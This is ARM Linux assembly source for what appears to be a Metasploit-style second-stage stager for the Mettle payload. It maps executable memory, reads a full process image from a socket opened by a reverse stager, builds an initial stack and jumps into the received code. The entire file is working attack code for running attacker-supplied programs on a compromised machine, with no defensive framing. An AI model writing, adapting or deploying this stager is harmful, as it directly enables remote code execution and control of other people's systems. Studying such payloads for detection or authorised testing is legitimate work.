.global _start

@ Required symbols:
@   SIZE: size of the final payload
@   ENTRY: entry point offset from the start of the process image

.text
_start:
  @ mmap the space for the mettle image
  mov r0, #0      @ address doesn't matter
  ldr r1, =SIZE   @ more than 12-bits
  mov r2, #7      @ PROT_READ | PROT_WRITE | PROT_EXECUTE
  mov r3, #34     @ MAP_PRIVATE | MAP_ANONYMOUS
  mov r4, #0      @ no file
  mov r5, #0      @ no offset

  mov r7, #192    @ syscall: mmap2
  svc #0

  @ recv the process image
  @ r12 contains our socket from the reverse stager
  mov r2, r1      @ recv the whole thing (I, too, like to live dangerously)
  mov r1, r0      @ move the mmap to the recv buffer
  mov r0, r12     @ set the fd
  mov r3, #0x100  @ MSG_WAITALL

  ldr r7, =#291   @ syscall: recv
  svc #0

  @ set up the initial stack
  @ The final stack must be aligned, so we align and then make room backwards
  @ by _adding_ to sp.
  and sp, #-16      @ Align
  add sp, #36 + 4   @ Add room for initial stack and prog name
  mov r4, #109      @  "m" (0,0,0,109)
  push {r4}         @ On the stack
  mov r4,#2         @ ARGC
  mov r5,sp         @ ARGV[0] char *prog_name
  mov r6,r12        @ ARGV[1] int socket fd
  mov r7,#0         @ (NULL)
  mov r8,#0         @ (NULL) (Ending ENV)
  mov r9,#7         @ AT_BASE
  mov r10,r1        @ mmap'd address
  mov r11,#0        @ AT_NULL
  mov r12,#0
  push {r4-r12}

  @ hack the planet
  ldr r0, =ENTRY
  add r0, r1
  bx r0
